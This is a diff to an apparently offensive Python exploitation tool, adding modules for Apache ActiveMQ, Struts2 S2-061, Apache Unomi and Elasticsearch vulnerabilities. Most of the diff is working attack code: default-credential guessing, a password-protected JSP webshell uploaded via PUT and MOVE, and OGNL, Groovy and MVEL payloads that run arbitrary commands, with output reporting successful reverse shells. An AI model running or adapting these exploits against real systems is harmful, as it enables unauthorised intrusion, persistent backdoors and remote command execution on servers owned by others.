@@ -19,6 +19,7 @@ import http.client
 import urllib
 import urllib.request
 import platform
+from lxml import etree
 from urllib import request, parse
 from urllib.parse import urlencode
 from urllib.parse import urlparse, quote
@@ -50,6 +51,11 @@ headers = {
 
 class Timed(object):
     def timed(self, de):
+        now = datetime.now()
+        time.sleep(de)
+        timed = color.cyan("["+str(now)[11:19]+"] ")
+        return timed
+    def timed_line(self, de):
         now = datetime.now()
         time.sleep(de)
         timed = color.cyan("["+str(now)[11:19]+"] ")
@@ -114,6 +120,8 @@ vulnlist = color.ccyan("""
  +-------------------+------------------+-----+-----+-------------------------------------------------------------+
  | Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
  +-------------------+------------------+-----+-----+-------------------------------------------------------------+
+ | Apache ActiveMQ   | CVE-2015-5254    |  Y  |  N  | < 5.13.0, deserialization remote code execution             |
+ | Apache ActiveMQ   | CVE-2016-3088    |  Y  |  Y  | < 5.14.0, http put&move upload webshell                     |
  | Apache Shiro      | CVE-2016-4437    |  Y  |  Y  | <= 1.2.4, shiro-550, rememberme deserialization rce         |
  | Apache Solr       | CVE-2017-12629   |  Y  |  Y  | < 7.1.0, runexecutablelistener rce & xxe, only rce is here  |
  | Apache Solr       | CVE-2019-0193    |  Y  |  N  | < 8.2.0, dataimporthandler module remote code execution     |
@@ -131,18 +139,22 @@ vulnlist = color.ccyan("""
  | Apache Struts2    | S2-048           |  Y  |  Y  | 2.3.x, cve-2017-9791 struts2-struts1-plugin rce             |
  | Apache Struts2    | S2-052           |  Y  |  Y  | 2.1.2 - 2.3.33, 2.5 - 2.5.12 cve-2017-9805 rest plugin rce  |
  | Apache Struts2    | S2-057           |  Y  |  Y  | 2.0.4 - 2.3.34, 2.5.0-2.5.16, cve-2018-11776 namespace rce  |
- | Apache Struts2    | S2-059           |  Y  |  Y  | 2.0.0 - 2.5.20 cve-2019-0230 ognl interpreter rce           |
+ | Apache Struts2    | S2-059           |  Y  |  Y  | 2.0.0 - 2.5.20, cve-2019-0230 ognl interpreter rce          |
+ | Apache Struts2    | S2-061           |  Y  |  Y  | 2.0.0-2.5.25, cve-2020-17530 ognl interpreter rce           |
  | Apache Struts2    | S2-devMode       |  Y  |  Y  | 2.1.0 - 2.5.1, devmode remote code execution                |
- | Apache Tomcat     | Examples File    |  Y  |  N  | all version, /examples/servlets/servlet/SessionExample      |
+ | Apache Tomcat     | Examples File    |  Y  |  N  | all version, /examples/servlets/servlet                     |
  | Apache Tomcat     | CVE-2017-12615   |  Y  |  Y  | 7.0.0 - 7.0.81, put method any files upload                 |
  | Apache Tomcat     | CVE-2020-1938    |  Y  |  Y  | 6, 7 < 7.0.100, 8 < 8.5.51, 9 < 9.0.31 arbitrary file read  |
+ | Apache Unomi      | CVE-2020-13942   |  Y  |  Y  | < 1.5.2, apache unomi remote code execution                 |
  | Drupal            | CVE-2018-7600    |  Y  |  Y  | 6.x, 7.x, 8.x, drupalgeddon2 remote code execution          |
  | Drupal            | CVE-2018-7602    |  Y  |  Y  | < 7.59, < 8.5.3 (except 8.4.8) drupalgeddon2 rce            |
  | Drupal            | CVE-2019-6340    |  Y  |  Y  | < 8.6.10, drupal core restful remote code execution         |
+ | Elasticsearch     | CVE-2014-3120    |  Y  |  Y  | < 1.2, elasticsearch remote code execution                  |
+ | Elasticsearch     | CVE-2015-1427    |  Y  |  Y  | 1.4.0 < 1.4.3, elasticsearch remote code execution          |
  | Jenkins           | CVE-2017-1000353 |  Y  |  N  | <= 2.56, LTS <= 2.46.1, jenkins-ci remote code execution    |
  | Jenkins           | CVE-2018-1000861 |  Y  |  Y  | <= 2.153, LTS <= 2.138.3, remote code execution             |
  | Nexus OSS/Pro     | CVE-2019-7238    |  Y  |  Y  | 3.6.2 - 3.14.0, remote code execution vulnerability         |
- | Nexus OSS/Pro     | CVE-2020-10199   |  Y  |  Y  | 3.x  <= 3.21.1, remote code execution vulnerability         |
+ | Nexus OSS/Pro     | CVE-2020-10199   |  Y  |  Y  | 3.x <= 3.21.1, remote code execution vulnerability          |
  | Oracle Weblogic   | CVE-2014-4210    |  Y  |  N  | 10.0.2 - 10.3.6, weblogic ssrf vulnerability                |
  | Oracle Weblogic   | CVE-2017-3506    |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.0-2, weblogic wls-wsat rce       |
  | Oracle Weblogic   | CVE-2017-10271   |  Y  |  Y  | 10.3.6.0, 12.1.3.0, 12.2.1.1-2, weblogic wls-wsat rce       |
@@ -177,7 +189,11 @@ explists = ("CVE-2017-12629"
             "S2-052"
             "S2-057"
             "S2-059"
+            "S2-061"
             "S2-devMode"
+            "CVE-2014-3120"
+            "CVE-2015-1427"
+            "CVE-2016-3088"
             "CVE-2016-4437"
             "CVE-2017-12615"
             "CVE-2020-1938"
@@ -200,13 +216,17 @@ explists = ("CVE-2017-12629"
             "CVE-2015-7501"
             "CVE-2018-20062"
             "CVE-2019-9082"
+            "CVE-2020-13942"
            )
 
 
 class Verification(object):
     def show(self, request, pocname, method, rawdata, info):
         if VULN is not None:
-            if r"PoCWating" in request:
+            if DEBUG == "debug":
+                print(rawdata)
+                pass
+            elif r"PoCWating" in request:
                 print (now.timed(de=DELAY)+color.rewarn()+color.magenta(" Command Executed Failed... ..."))
             else:
                 print (request)
@@ -215,10 +235,10 @@ class Verification(object):
             print (now.timed(de=DELAY)+color.green("[+] The target is "+pocname+" ["+method+"] "+info))
         else:
             print (now.timed(de=DELAY)+color.yellow("[?] Can't judge "+pocname))
-        if DEBUG=="debug":
-            print (rawdata)
+        #if DEBUG=="debug":
+        #    print (rawdata)
         if OUTPUT is not None:
-            self.file_output(self.no_color_show_succes(request, pocname, method, rawdata, info))
+            self.text_output(self.no_color_show_succes(pocname, info))
             
     def no_rce_show(self, request, pocname, method, rawdata, info):
         if VULN is not None:
@@ -227,33 +247,37 @@ class Verification(object):
             else:
                 print (request)
             return None
-        print (now.timed(de=DELAY)+color.green("[+] The target is "+pocname+" ["+method+"] "+info))
+        if r"PoCSuSpEct" in request:
+            print(now.timed(de=DELAY) + color.yellow("[?] The target suspect " + pocname + " [" + method + "] " + info))
+        elif r"PoCSuCCeSS" in request:
+            print (now.timed(de=DELAY)+color.green("[+] The target is "+pocname+" ["+method+"] "+info))
         #print (info)
         if DEBUG=="debug":
             print (rawdata)
         if OUTPUT is not None:
-            self.file_output(self.no_color_show_succes(request, pocname, method, rawdata, info))
-    def no_color_show_succes(self, request, pocname, method, rawdata, info):
-        return now.no_color_timed(de=DELAY)+"[+] The target is "+pocname+" ["+method+"] "+info+'\n'+rawdata
-    def no_color_show_failed(self, request, pocname, method, rawdata, info):
-        return now.no_color_timed(de=DELAY)+"[-] The target is "+pocname+" ["+method+"] "
+            self.text_output(self.no_color_show_succes(pocname, info))
+    def no_color_show_succes(self, pocname, info):
+        return "--> "+pocname+" "+info
+    def no_color_show_failed(self, pocname, info):
+        return "--> "+pocname+" "+info
     def generic_output(self, request, pocname, method, rawdata, info):
         # Echo Error
-        if r"echo%20VuLnEcHoPoCSuCCeSS" in request or r"echo VuLnEcHoPoCSuCCeSS" in request:
-            print (now.timed(de=DELAY)+color.magenta("[-] The target no "+pocname))
+        if r"echo VuLnEcHoPoCSuCCeSS" in request or r"echo%20VuLnEcHoPoCSuCCeSS" in request or r"echo%2520VuLnEcHoPoCSuCCeSS" in request or r"%65%63%68%6f%20%56%75%4c%6e%45%63%48%6f%50%6f%43%53%75%43%43%65%53%53" in request:
+            print("\r{0}{1}{2}".format(now.timed(de=DELAY), color.magenta("[-] The target no "),
+                  color.magenta(pocname)),end="                    \r",flush = True)
         elif r"VuLnEcHoPoCSuCCeSS" in request:
             self.show(request, pocname, method, rawdata, info)
         # Linux host ====================================================================
-        elif r"uid=" in request:
-            info = info+color.green(" [os:linux]")
-            self.show(request, pocname, method, rawdata, info)
-        elif r"Active Internet connections" in request or r"command not found" in request:
-            info = info+color.green(" [os:linux]")
-            self.show(request, pocname, method, rawdata, info)
+        #elif r"uid=" in request:
+        #    info = info+color.green(" [os:linux]")
+        #    self.show(request, pocname, method, rawdata, info)
+        #elif r"Active Internet connections" in request or r"command not found" in request:
+        #    info = info+color.green(" [os:linux]")
+        #    self.show(request, pocname, method, rawdata, info)
         # Windows host ==================================================================
-        elif r"Active Connections" in request  or r"活动连接" in request:
-            info = info+color.green(" [os:windows]")
-            self.show(request, pocname, method, rawdata, info)
+        #elif r"Active Connections" in request  or r"活动连接" in request:
+        #    info = info+color.green(" [os:windows]")
+        #    self.show(request, pocname, method, rawdata, info)
         # Public :-)
         elif r":-)" in request:
             self.no_rce_show(request, pocname, method, rawdata, info)
@@ -261,49 +285,156 @@ class Verification(object):
         elif r"Welcome to Tomcat" in request and r"You may obtain a copy of the License at" in request:
             self.no_rce_show(request, pocname, method, rawdata, info)
         # Struts2-045 "233x233"
-        elif r"54289" in request:
             self.show(request, pocname, method, rawdata, info)
+        # Public: "PoCSuSpEct" in request
+        elif r"PoCSuSpEct" in request:
+            self.no_rce_show(request, pocname, method, rawdata, info)
         # Public: "PoCSuCCeSS" in request
         elif r"PoCSuCCeSS" in request:
             self.no_rce_show(request, pocname, method, rawdata, info)
         # Public: "PoCWating" in request ,Failed
         elif r"PoCWating" in request:
-            print (now.timed(de=DELAY)+color.magenta("[-] The target no "+pocname))
+            print("\r{0}{1}{2}".format(now.timed(de=DELAY), color.magenta("[-] The target no "),
+                  color.magenta(pocname)),end="                    \r",flush = True)
         # Public: "netstat -an" command check
         elif r"NC-Succes" in request:
             print (now.timed(de=DELAY)+color.yeinfo()+color.green(" The reverse shell succeeded. Please check"))
         elif r"NC-Failed" in request:
             print (now.timed(de=DELAY)+color.rewarn()+color.magenta(" The reverse shell failed. Please check"))
-            
         else:
             #print (now.timed(de=DELAY)+color.magenta("[-] The target no "+pocname))
             if VULN is not None:
-                if r"PoCWating" in request:
+                if DEBUG == "debug":
+                    print(rawdata)
+                    pass
+                elif r"PoCWating" in request:
                     print (now.timed(de=DELAY)+color.rewarn()+color.magenta(" Command Executed Failed... ..."))
                 else:
                     print (request)
                 return None
             if CMD == "netstat -an" or CMD == "id" or CMD == "echo VuLnEcHoPoCSuCCeSS":
-                print (now.timed(de=DELAY)+color.magenta("[-] The target no "+pocname))
+                print("\r{0}{1}{2}".format(now.timed(de=DELAY), color.magenta("[-] The target no "), 
+                      color.magenta(pocname)),end="                    \r",flush = True)
             else:
                 print (now.timed(de=DELAY)+color.yellow("[?] Can't judge "+pocname))
             if DEBUG=="debug":
                 print (rawdata)
-            if OUTPUT is not None:
-                self.file_output(self.no_color_show_failed(request, pocname, method, rawdata, info))
-                
+
     def timeout_output(self, pocname):
         print (now.timed(de=DELAY)+color.rewarn()+color.cyan(" "+pocname+" check failed because timeout !!!"))
-        if OUTPUT is not None:
-            self.file_output(now.no_color_timed(de=DELAY)+" "+pocname+" check failed because timeout !!!")
+
     def connection_output(self, pocname):
         print (now.timed(de=DELAY)+color.rewarn()+color.cyan(" "+pocname+" check failed because unable to connect !!!"))
-        if OUTPUT is not None:
-            self.file_output(now.no_color_timed(de=DELAY)+" "+pocname+" check failed because unable to connect !!!")
-    def file_output(self, item):
+
+    def text_output(self, item):
         with open(OUTPUT, 'a') as output_file:
             output_file.write("%s\n" % item)
 verify = Verification()
+
+
+class ApacheActiveMQ():
+    def __init__(self, url):
+        self.url = url
+        self.jsp_webshell = '<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><' \
+            '%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro =' \
+            ' Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInpu' \
+            'tStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.cl' \
+            'ose();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("password".equ' \
+            'als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCm' \
+            'd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'
+
+    def cve_2015_5254(self):
+        self.pocname = "Apache AcitveMQ: CVE-2015-5254"
+        self.rawdata = None
+        self.info = color.rce()
+        self.method = "get"
+        self.r = "PoCWating"
+        self.passlist = ["admin:123456", "admin:admin", "admin:123123", "admin:activemq", "admin:12345678"]
+        try:
+            for self.pa in self.passlist:
+                self.base64_p = base64.b64encode(str.encode(self.pa))
+                self.p = self.base64_p.decode('utf-8')
+                self.headers_base64 = {
+                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+                    'Authorization': 'Basic '+self.p
+                }
+                self.request = requests.get(self.url + "/admin", headers=self.headers_base64, timeout=TIMEOUT, verify=False)
+                self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
+                if self.request.status_code == 200:
+                    self.get_ver = re.findall("<td><b>(.*)</b></td>", self.request.text)[1]
+                    self.ver = self.get_ver.replace(".", "")
+                    break
+            if int(self.ver) < 5130:
+                self.r = "PoCSuCCeSS"
+                self.info += " [version check] [activemq version: " + self.get_ver + "]"
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+        except requests.exceptions.Timeout as error:
+            verify.timeout_output(self.pocname)
+        except requests.exceptions.ConnectionError as error:
+            verify.connection_output(self.pocname)
+        except Exception as error:
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+
+    def cve_2016_3088(self):
+        self.pocname = "Apache AcitveMQ: CVE-2016-3088"
+        self.rawdata = None
+        self.path = "null"
+        self.info = "null"
+        self.method = "put&move"
+        self.name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
+        self.webshell = "/"+self.name+".jsp"
+        self.poc = ":-)"
+        self.exp = self.jsp_webshell
+        self.passlist = ["admin:123456","admin:admin","admin:123123","admin:activemq","admin:12345678"]
+        try:
+            for self.pa in self.passlist:
+                self.base64_p = base64.b64encode(str.encode(self.pa))
+                self.p = self.base64_p.decode('utf-8')
+                self.headers_base64 = {
+                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+                    'Authorization': 'Basic '+self.p
+                }
+                self.request = requests.get(self.url + "/admin/test/systemProperties.jsp", headers=self.headers_base64,
+                                            timeout=TIMEOUT, verify=False)
+                if self.request.status_code == 200:
+                    self.path = \
+                    re.findall('<td class="label">activemq.home</td>.*?<td>(.*?)</td>', self.request.text, re.S)[0]
+                    break
+            if VULN == None:
+                self.request = requests.put(self.url + "/fileserver/v.txt", headers=self.headers_base64, data=self.poc,
+                                            timeout=TIMEOUT, verify=False)
+                self.headers_move = {
+                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+                    'Destination': 'file://' + self.path + '/webapps/api' + self.webshell
+                }
+                self.request = requests.request("MOVE", self.url + "/fileserver/v.txt", headers=self.headers_move,
+                                                timeout=TIMEOUT, verify=False)
+                self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
+                self.request = requests.get(self.url + "/api" + self.webshell, headers=self.headers_base64,
+                                            timeout=TIMEOUT, verify=False)
+                self.info = "[upload: "+self.url+"/api"+self.webshell+" ]"+" ["+self.pa+"]"
+                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            else:
+                self.request = requests.put(self.url + "/fileserver/v.txt", headers=self.headers_base64, data=self.exp,
+                                            timeout=TIMEOUT, verify=False)
+                self.headers_move = {
+                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+                    'Destination': 'file://' + self.path + '/webapps/api' + self.webshell
+                }
+                self.request = requests.request("MOVE", self.url + "/fileserver/v.txt", headers=self.headers_move,
+                                                timeout=TIMEOUT, verify=False)
+                self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
+                self.request = requests.get(self.url + "/api" + self.webshell + "?pwd=password&cmd="+CMD, headers=self.headers_base64,
+                                            timeout=TIMEOUT, verify=False)
+                self.r = "[webshell: "+self.url+"/api"+self.webshell+"?pwd=password&cmd="+CMD+" ]\n"
+                self.r += self.request.text
+                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+        except requests.exceptions.Timeout as error:
+            verify.timeout_output(self.pocname)
+        except requests.exceptions.ConnectionError as error:
+            verify.connection_output(self.pocname)
+        except Exception as error:
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
 
 class ApacheShiro():
@@ -596,7 +727,7 @@ class ApacheShiro():
                             self.Gadget = "CommonsCollectionsK1"
                         if r"VuLnEcHoPoCSuCCeSS" in self.request.text:
                             self.r = "PoCSuCCeSS"
-                            self.info = color.rce() + color.green(" [key:" + self.key + "] [gadget:" + self.Gadget + "]")
+                            self.info = color.rce() + " [key:" + self.key + "] [gadget:" + self.Gadget + "]"
                             verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
                             break
                 if self.r != "PoCSuCCeSS":
@@ -783,7 +914,7 @@ class ApacheSolr():
             if VULN == None:
                 self.request = requests.post(self.urlapi, data=self.set_api_data, headers=self.headers_json, timeout=TIMEOUT, verify=False)
                 self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-                if self.request.status_code == 200:
+                if self.request.status_code == 200 and self.corename != None:
                     self.r = "PoCSuCCeSS"
                     verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                 else:
@@ -801,9 +932,6 @@ class ApacheSolr():
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
 
-# ApacheStruts2 vulnerability check
-# Both windows and linux have built-in "netstat" command
-# Relying on the execution of the "netstat -an" command to determine that there is a vulnerability
 class ApacheStruts2():
     def __init__(self, url):
         http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
@@ -976,10 +1104,14 @@ class ApacheStruts2():
             r"3a.exec('RECOMMAND').getInputStream()).useDelimiter('%5C%5C%5C" \
             r"%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.p" \
             r"rint(%23str)%2C%23res.close()%0A%7d"
+        #self.payload_s2_061 = r"""%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("RECOMMAND")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}"""
+        #self.payload_s2_061 = '%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27"RECOMMAND"%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d'
+        self.payload_s2_061 = r"""%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27RECOMMAND%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"""
         self.payload_s2_devMode = r"?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" \
             r"%3F(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toS" \
             r"tring(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toStri" \
             r"ng.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=RECOMMAND"
+
 
 
     def s2_005(self):
@@ -1291,6 +1423,8 @@ class ApacheStruts2():
         self.rawdata = "null"
         self.info = color.rce()
         self.payload = self.payload_s2_059.replace("RECOMMAND",CMD)
+        if r"?" not in self.url:
+            self.url = self.url + "?id="
         try:
             self.request = requests.post(self.url, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
@@ -1300,7 +1434,28 @@ class ApacheStruts2():
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+
+    def s2_061(self):
+        self.pocname = "Apache Struts2: S2-061"
+        self.method = "get"
+        self.rawdata = "null"
+        self.info = color.rce()
+        self.payload = self.payload_s2_061.replace("RECOMMAND",CMD)
+        try:
+            self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            self.page = self.request.text
+            self.page = etree.HTML(self.page)
+            self.r = self.page.xpath('//a[@id]/@id')[0]
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+        except requests.exceptions.Timeout as error:
+            verify.timeout_output(self.pocname)
+        except requests.exceptions.ConnectionError as error:
+            verify.connection_output(self.pocname)
+        except Exception as error:
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+
 
     def s2_devMode(self):
         self.pocname = "Apache Struts2: S2-devMode"
@@ -1470,6 +1625,46 @@ class ApacheTomcat():
         self.fr.attributes = []
         return self.fr
 
+
+class ApacheUnomi():
+    def __init__(self, url):
+        self.url = url
+        self.payload_cve_2020_13942 = '''{ "filters": [ { "id": "myfilter1_anystr", "filters": [ { "condition": {  "parameterValues": {  "": "script::Runtime r = Runtime.getRuntime(); r.exec(\\"RECOMMAND\\");" }, "type": "profilePropertyCondition" } } ] } ], "sessionId": "test-demo-session-id_anystr" }'''
+
+    def cve_2020_13942(self):
+        self.pocname = "Apache Unomi: CVE-2020-13942"
+        self.method = "post"
+        self.rawdata = "null"
+        self.info = color.rce()
+        self.r = "PoCWating"
+        self.payload = self.payload_cve_2020_13942.replace("RECOMMAND", CMD)
+        self.headers = {
+            'Host': '34.87.38.169:8181',
+            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
+            'Accept': '*/*',
+            'Connection': 'close',
+            'Content-Type': 'application/json'
+        }
+        try:
+            self.request = requests.post(self.url + "/context.json", data=self.payload, headers=self.headers,
+                                         timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
+            self.rep = list(json.loads(self.request.text)["trackedConditions"])[0]["parameterValues"]["pagePath"]
+            if VULN == None:
+                if r"/tracker/" in self.rep:
+                    self.r = "PoCSuSpEct"
+                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            else:
+                self.r = "Command Executed Successfully (But No Echo)"
+                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+        except requests.exceptions.Timeout as error:
+            verify.timeout_output(self.pocname)
+        except requests.exceptions.ConnectionError as error:
+            verify.connection_output(self.pocname)
+        except Exception as error:
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+
+
 class Drupal():
     def __init__(self, url):
         self.url = url
@@ -1609,6 +1804,85 @@ class Drupal():
             verify.connection_output(self.pocname)
         except Exception as error:
             verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
+
+class Elasticsearch():
+    def __init__(self, url):
+        # http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
+        self.url = url
+        self.getipport = urlparse(self.url)
+        self.hostname = self.getipport.hostname
+        self.port = self.getipport.port
+        if self.port == None and r"https://" in self.url:
+            self.port = 443
+        elif self.port == None and r"http://" in self.url:
+            self.port = 80
+        if r"https://" in self.url:
+            self.url = "https://"+self.hostname+":"+str(self.port)
+        if r"http://" in self.url:
+            self.url = "http://"+self.hostname+":"+str(self.port)
+        self.host = self.hostname + ":" + str(self.port)
+        self.headers = {
+            'Host': ""+self.host,
+            'Accept': '*/*',
+            'Connection': 'close',
+            'Accept-Language': 'en',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+        self.payload_cve_2014_3120 = r'''{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":''' \
+            r'''{"command":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec''' \
+            r'''(\"RECOMMAND\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'''
+        self.payload_cve_2015_1427 = r'''{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"RECOMMAND\").getText()"}}}'''
+    def cve_2014_3120(self):
+        self.pocname = "Elasticsearch: CVE-2014-3120"
+        self.method = "post"
+        self.rawdata = "null"
+        self.info = color.rce()
+        self.data_send_info = r'''{ "name": "cve-2014-3120" }'''
+        self.data_rce = self.payload_cve_2014_3120.replace("RECOMMAND", CMD)
+        try:
+            self.request = requests.post(self.url+"/website/blog/", data=self.data_send_info, headers=self.headers, timeout=TIMEOUT, verify=False)
+            self.request = requests.post(self.url+"/_search?pretty", data=self.data_rce, headers=self.headers, timeout=TIMEOUT, verify=False)
+            self.r = list(json.loads(self.request.text)["hits"]["hits"])[0]["fields"]["command"][0]
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+        except requests.exceptions.Timeout as error:
+            verify.timeout_output(self.pocname)
+        except requests.exceptions.ConnectionError as error:
+            verify.connection_output(self.pocname)
+        except Exception as error:
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+
+    def cve_2015_1427(self):
+        self.pocname = "Elasticsearch: CVE-2015-1427"
+        self.method = "post"
+        self.rawdata = "null"
+        self.info = color.rce()
+        self.data_send_info = r'''{ "name": "cve-2015-1427" }'''
+        self.data_rce = self.payload_cve_2015_1427.replace("RECOMMAND", CMD)
+        self.host = self.hostname + ":" + str(self.port)
+        self.headers_text = {
+            'Host': ""+self.host,
+            'Accept': '*/*',
+            'Connection': 'close',
+            'Accept-Language': 'en',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+            'Content-Type': 'application/text'
+        }
+        try:
+            self.request = requests.post(self.url + "/website/blog/", data=self.data_send_info, headers=self.headers,
+                                         timeout=TIMEOUT, verify=False)
+            self.request = requests.post(self.url + "/_search?pretty", data=self.data_rce, headers=self.headers_text,
+                                     timeout=TIMEOUT, verify=False)
+            self.r = list(json.loads(self.request.text)["hits"]["hits"])[0]["fields"]["lupin"][0]
+            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+        except requests.exceptions.Timeout as error:
+            verify.timeout_output(self.pocname)
+        except requests.exceptions.ConnectionError as error:
+            verify.connection_output(self.pocname)
+        except Exception as error:
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
 class Jenkins():
     def __init__(self, url):
@@ -1883,6 +2157,7 @@ class Nexus():
 
 class OracleWeblogic():
     def __init__(self, url):
+        http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
         self.url = url
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
@@ -13370,7 +13645,7 @@ class OracleWeblogic():
                                          headers=self.headers_rce, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
             if r"VuLnEcHoPoCSuCCeSS" in self.request.text:
-                self.r = PoCSuCCeSS
+                self.r = "PoCSuCCeSS"
                 verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
             else:
                 verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
@@ -13619,6 +13894,7 @@ class OracleWeblogic():
                 sock.send(bytes.fromhex(self.payload))
                 time.sleep(1)
                 sock.send(bytes.fromhex(self.payload))
+                sock.close()
                 self.r = "Command Executed Successfully (No Echo)"
